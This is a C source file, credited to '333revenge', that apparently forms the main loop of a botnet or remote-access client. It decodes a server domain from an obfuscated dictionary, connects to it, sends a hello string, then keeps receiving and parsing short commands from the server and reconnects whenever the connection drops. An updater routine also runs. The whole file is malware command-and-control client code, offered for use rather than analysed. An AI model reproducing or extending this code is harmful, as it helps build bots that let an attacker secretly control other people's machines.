// Developed by 333revenge

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>

#include <dict.h>
#include <utils.h>
#include <receiver.h>
#include <command.h>
#include <updater.h>

#define RESPONSE_SIZE 16

uint8_t is_connected(int socket_fd)
{
    fd_set read_fds;
    struct timeval timeout = {0, 0};

    FD_ZERO(&read_fds);
    FD_SET(socket_fd, &read_fds);

    int status = select(socket_fd + 1, &read_fds, NULL, NULL, &timeout);
    if (status == 0)
    {
        return 1;
    }
    else if (status > 0)
    {
        if (FD_ISSET(socket_fd, &read_fds))
        {
            return 1;
        }
    }
    return 0;
}

int main(int argc, char **argv)
{
    dict_init();

    int client_fd;
    struct sockaddr_in server_address;
    uint8_t buffer[RESPONSE_SIZE];
    const char *message = dict_get(DICT_SERVER_HELLO);

    uint8_t is_first_cycle = 1;

    while (1)
    {   
        updater_init();

        if (is_connected(client_fd) == 0 || is_first_cycle == 1)
        {
            if (receiver_init(&client_fd, &server_address, dict_get(DICT_DOMAIN_NAME)) != 0)
            {
#ifdef DEBUG
                printf("[main] Connection failed, retrying in 2 seconds...\n");
#endif
                sleep(2);
                continue;
            }

#ifdef DEBUG
            printf("[main] Initialized socket\n");
#endif

            if (send(client_fd, message, strlen(message), 0) < 0)
            {
#ifdef DEBUG
                perror("[main] Error: Sending data");
#endif
                close(client_fd);
                sleep(2);
                continue;
            }

#ifdef DEBUG
            printf("[main] Sent message to server\n");
#endif
        }

        ssize_t received = recv_server_command(client_fd, buffer, sizeof(buffer));

        if (received < 0)
        {
#ifdef DEBUG
            printf("[main] Connection lost, reconnecting...\n");
#endif
            close(client_fd);
            sleep(2);
            continue;
        }

#ifdef DEBUG
        if (received > 0)
        {
            printf("[main] Received from server: ");
            for (int i = 0; i < RESPONSE_SIZE; i++)
            {
                printf("%02x ", buffer[i]);
            }
            printf("\n");
        }
        else
        {
            printf("[main] No data received\n");
        }
#endif

        uint8_t is_command_parsed = parse_command_from_buffer(buffer);

#ifdef DEBUG
        printf("[main] Command parsed result: %s (%d)\n", is_command_parsed ? "Success" : "Error", is_command_parsed);
#endif

        memset(buffer, 0, sizeof(buffer));
        is_first_cycle = 0;

        sleep(2);
    }

    close(client_fd);
    dict_free();
    return 0;
}
